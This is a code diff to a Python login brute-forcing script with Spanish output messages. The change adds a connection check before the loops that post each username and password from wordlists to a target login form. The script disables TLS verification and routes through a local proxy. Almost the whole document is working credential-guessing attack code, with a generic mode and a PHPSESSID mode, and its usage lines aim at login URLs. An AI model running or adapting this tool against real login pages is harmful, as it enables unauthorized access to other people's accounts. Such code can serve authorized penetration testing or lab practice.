@@ -1,11 +1,28 @@
 import argparse
 import requests
+from requests.exceptions import ConnectionError, Timeout, RequestException
 import urllib3
 import sys
 import datetime
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
+
+def check_connection(url):
+	try:
+		r = requests.get(url, verify=False, timeout=10)
+		r.raise_for_status()
+		if r.status_code == 200:
+			return True
+		else:
+			return False
+	except ConnectionError as e:
+		print(f"[!] Error de conexión: No se pudo establecer la conexión con el host. {e}")
+	except Timeout as e:
+		print(f"Error de tiempo de espera: El servidor no respondió a tiempo. {e}")
+	except RequestException as e:
+		print(f"Error general en la solicitud: {e}")
+	return False
 
 def read_file(filename):
 	try:
@@ -38,37 +55,51 @@ def brutus_panel(username, password):
 
 def obtain_credentials(VERBOSE, url, username, password, time):
 	brutus_panel(len(username), len(password))
-	print("\033[34m[+] Finding credentials...\033[0m\n")
-	for i in username:
-		for j in password:
-			data = {'username': i, 'password': j}
-			r = requests.post(url, data=data, verify=False)
-			if VERBOSE:
-				print(f"[+] {time.strftime('%Y-%m-%d %H:%M:%S')} Trying: username: \033[34m{i}\033[0m - password: \033[34m{j}\033[0m - Status code: \033[32m{r.status_code}\033[0m")
-				if r.status_code == 200 and 'session' not in r.cookies:
+	connection = check_connection(url)
+	print(f"[+] Estableciendo conexión: \033[32m{connection}\033[0m")
+	if connection:
+		print(f"[+] Conexión establecida: \033[32m{connection}\033[0m\n")
+		print("\033[34m[+] Finding credentials...\033[0m\n")
+		for i in username:
+			for j in password:
+				data = {'username': i, 'password': j}
+				r = requests.post(url, data=data, verify=False)
+				if VERBOSE:
+					print(f"[+] {time.strftime('%Y-%m-%d %H:%M:%S')} Trying: username: \033[34m{i}\033[0m - password: \033[34m{j}\033[0m - Status code: \033[32m{r.status_code}\033[0m")
+					if r.status_code == 200 and 'session' not in r.cookies:
+						credentials = [i, j]
+						return credentials
+				elif r.status_code == 200 and 'session' not in r.cookies:
 					credentials = [i, j]
 					return credentials
-			elif r.status_code == 200 and 'session' not in r.cookies:
-				credentials = [i, j]
-				return credentials
-	return None
+		return None
+	else:
+		print("\033[31m[-] Fallo en conexión\033[0m")
+		sys.exit(1)
 
 def payload_PHPSESSID(VERBOSE, PHPSESSID, url, username, password, time):
 	brutus_panel(len(username), len(password))
-	print("\033[34m[+] Finding credentials...\033[0m\n")
-	for i in username:
-		for j in password:
-			data = {'username': i, 'password': j}
-			r = requests.post(url, data=data, verify=False)
-			if VERBOSE:
-				print(f"[+] {time.strftime('%Y-%m-%d %H:%M:%S')} Trying in PHP: username: \033[34m{i}\033[0m - password: \033[34m{j}\033[0m - Status code: \033[32m{r.status_code}\033[0m")
-				if r.status_code == 200 and 'PHPSESSID' not in r.cookies:
-					credentials = [i, j]
-					return credentials
-			elif r.status_code == 200 and 'PHPSESSID' not in r.cookies:
-					credentials = [i, j]
-					return credentials
-	return None
+	connection = check_connection(url)
+	print(f"[+] Estableciendo conexión: \033[32m{connection}\033[0m")
+	if connection:
+		print(f"[+] Conexión establecida: \033[32m{connection}\033[0m\n")
+		print("\033[34m[+] Finding credentials...\033[0m\n")
+		for i in username:
+			for j in password:
+				data = {'username': i, 'password': j}
+				r = requests.post(url, data=data, verify=False)
+				if VERBOSE:
+					print(f"[+] {time.strftime('%Y-%m-%d %H:%M:%S')} Trying in PHP: username: \033[34m{i}\033[0m - password: \033[34m{j}\033[0m - Status code: \033[32m{r.status_code}\033[0m")
+					if r.status_code == 200 and 'PHPSESSID' not in r.cookies:
+						credentials = [i, j]
+						return credentials
+				elif r.status_code == 200 and 'PHPSESSID' not in r.cookies:
+						credentials = [i, j]
+						return credentials
+		return None
+	else:
+		print("\033[31m[-] Fallo en conexión\033[0m")
+		sys.exit(1)
 
 def get_user_pass(args):
 	actions = {
@@ -124,6 +155,7 @@ def main():
 			print(f" {sys.argv[0]} -T http://www.example.com/login -u <USER> -p <PASSWORD>")
 			print(f" {sys.argv[0]} -T http://www.example.com/login.php -php -U users.txt -P passwords.txt")
 			sys.exit(1)
+
 	except KeyboardInterrupt:
 			print("\033[33m\n[-] Exited...\033[0m")
 
